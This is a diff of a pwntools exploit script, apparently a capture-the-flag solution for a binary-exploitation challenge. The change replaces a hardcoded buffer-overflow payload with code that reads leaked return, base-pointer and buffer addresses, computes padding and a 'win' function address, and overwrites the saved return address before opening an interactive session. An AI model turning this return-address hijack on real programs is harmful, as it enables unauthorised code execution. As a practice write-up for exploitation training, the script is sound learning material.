@@ -38,7 +38,7 @@ continue
 # PIE:      PIE enabled
 # RWX:      Has RWX segments
 
-io = start()
+r = start()
 
 # shellcode = asm(shellcraft.sh())
 # payload = fit({
@@ -48,16 +48,40 @@ io = start()
 # io.send(payload)
 # flag = io.recv(...)
 # log.success(flag)
-io.recvuntil(b"Please select from menu: ")
-io.sendline(b"1")
+r.recvuntil(b"Please select from menu: ")
+r.sendline(b"1")
 # io.sendline(b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x1a\x05\xcbuvU\x00\x00")
 # payload = 'a' * (0x7fffffffdf30 - 0x7fffffffdf10 + 8 )
 # win = bytes.fromhex('55555555551a').decode('utf-8')
 # c = payload + win
 # print(c)
-io.sendline(b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x1aUUUUU\x00\x00")
+# io.sendline(b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x1aUUUUU\x00\x00")
 
 # writing = b"1\n" + b"a"*40 + struct.pack("<Q",0x55555555551a)
 # io.sendline(writing)
-io.interactive()
+
+r.recvuntil(b"Current Return Address: ")
+rip_savd = int(r.recvline().decode(), 16)
+
+r.recvuntil(b"the base pointer: ")
+rbp = int(r.recvline().decode(), 16)
+
+r.recvuntil(b"will be stored: ")
+buffer = int(r.recvline().decode(), 16)
+
+rip = rbp + 8
+
+padding = rbp - buffer + 8
+
+print(padding)
+
+win_addr = rip_savd - 0x17e9 + 0x151a
+print(type(0x17e9))
+print("win_addr ", struct.pack("<Q", win_addr))
+
+payload = b"a"*padding + struct.pack("<Q", win_addr)
+
+r.sendline(payload)
+
+r.interactive()
 
